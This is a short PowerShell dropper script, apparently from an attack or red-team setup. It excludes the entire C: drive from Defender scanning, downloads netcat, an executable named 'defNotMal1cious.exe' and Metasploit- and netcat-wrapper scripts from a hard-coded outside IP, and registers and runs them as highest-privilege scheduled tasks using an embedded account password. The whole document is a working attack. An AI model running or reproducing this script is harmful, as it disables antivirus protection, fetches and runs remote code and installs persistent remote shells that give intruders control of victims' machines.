Add-MpPreference -ExclusionPath "C:\";
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFile C:/nc.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMal1cious.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperMSF.ps1 -OutFile C:/windowsWrapperMSF.ps1;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.ps1 -OutFile C:/windowsWrapperNC.ps1;
$Action2=New-ScheduledTaskAction -Execute Powershell.exe -WorkingDirectory C:/ -Argument '.\windowsWrapperMSF.ps1';
$Action1=New-ScheduledTaskAction -Execute Powershell.exe -WorkingDirectory C:/ -Argument '.\windowsWrapperNC.ps1';
Register-ScheduledTask -TaskName "windowsMSF" -Action $Action2 -RunLevel Highest -User "HashCrackUser1" -Password "This is a basic passphrase";
Register-ScheduledTask -TaskName "windowsNC" -Action $Action1 -RunLevel Highest -User "HashCrackUser1" -Password "This is a basic passphrase";
schtasks.exe /run /tn windowsNC;
schtasks.exe /run /tn windowsMSF;
